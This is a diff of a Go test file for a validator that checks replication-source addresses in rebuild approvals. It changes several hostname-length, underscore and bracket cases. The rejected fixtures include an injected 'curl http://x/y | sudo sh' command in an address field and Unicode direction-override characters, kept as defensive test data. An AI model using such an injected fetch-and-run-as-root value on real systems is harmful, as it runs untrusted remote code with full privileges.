@@ -375,12 +375,17 @@ var unusableApprovals = map[string]proto.RebuildApprovalResult{
 	"source with U+202E":  {Required: true, Code: "123456", Source: "db\u202ebaru:3306", RemainingSec: 1700},
 	"approved bracket form": {Required: true, Approved: true, Source: "[jalankan: curl http://x/y | sudo sh]:3306",
 		Addr: "10.0.0.1", RemainingSec: 86000},
-	"source port 0":      {Required: true, Code: "123456", Source: "db-baru:0", RemainingSec: 1700},
-	"source port 65536":  {Required: true, Code: "123456", Source: "db-baru:65536", RemainingSec: 1700},
-	"source long label":  {Required: true, Code: "123456", Source: strings.Repeat("a", 64) + ".lan:3306", RemainingSec: 1700},
-	"source long name":   {Required: true, Code: "123456", Source: strings.Repeat("abcdefghi.", 25) + "lann:3306", RemainingSec: 1700},
-	"source empty label": {Required: true, Code: "123456", Source: "db..lan:3306", RemainingSec: 1700},
-	"source underscore":  {Required: true, Code: "123456", Source: "db_baru:3306", RemainingSec: 1700},
+	"source port 0":     {Required: true, Code: "123456", Source: "db-baru:0", RemainingSec: 1700},
+	"source port 65536": {Required: true, Code: "123456", Source: "db-baru:65536", RemainingSec: 1700},
+	// Longer than the 255 characters the panel takes for a master's
+	// replication address (N-1).
+	"source long name":      {Required: true, Code: "123456", Source: strings.Repeat("abcdefghi.", 25) + "lannnn:3306", RemainingSec: 1700},
+	"source with U+200F":    {Required: true, Code: "123456", Source: "db\u200fbaru:3306", RemainingSec: 1700},
+	"source with tab":       {Required: true, Code: "123456", Source: "db\tbaru:3306", RemainingSec: 1700},
+	"source bracketed name": {Required: true, Code: "123456", Source: "[db_baru]:3306", RemainingSec: 1700},
+	"approved bracketed name": {Required: true, Approved: true, Source: "[db-baru.lan]:3306", Addr: "10.0.0.1",
+		RemainingSec: 86000},
+	"source colon in name": {Required: true, Code: "123456", Source: "[db:baru]:3306", RemainingSec: 1700},
 	// A request with no time left (P-8): the agent makes a new one on
 	// the next read.
 	"request no time left":  {Required: true, Code: "123456", Source: "10.0.0.1:3306"},
@@ -533,6 +538,15 @@ func TestRebuildApprovalUsable(t *testing.T) {
 		{Required: true, Approved: true, Source: "10.0.0.1:3306", Addr: "10.0.0.1"},
 		{Required: true, Code: "123456", Source: "DB-1.rs.example:65535", RemainingSec: 1700},
 		{Required: true, Code: "123456", Source: strings.Repeat("a", 63) + ".lan:1", RemainingSec: 1700},
+		// What the panel accepts as a master's replication address, and
+		// the agent as its pinned source (N-1): an underscore, a trailing
+		// dot, a label over 63 characters, 255 characters in all.
+		{Required: true, Code: "123456", Source: "db_master:3306", RemainingSec: 1700},
+		{Required: true, Approved: true, Source: "db_master:3306", Addr: "10.0.0.1", RemainingSec: 86000},
+		{Required: true, Code: "123456", Source: "srv-db.rs.local.:3306", RemainingSec: 1700},
+		{Required: true, Code: "123456", Source: strings.Repeat("a", 64) + ".lan:3306", RemainingSec: 1700},
+		{Required: true, Code: "123456", Source: strings.Repeat("abcdefghi.", 25) + "lanns:3306", RemainingSec: 1700},
+		{Required: true, Code: "123456", Source: "[10.0.0.1]:3306", RemainingSec: 1700},
 	} {
 		if !RebuildApprovalUsable(res) {
 			t.Errorf("%+v not usable", res)
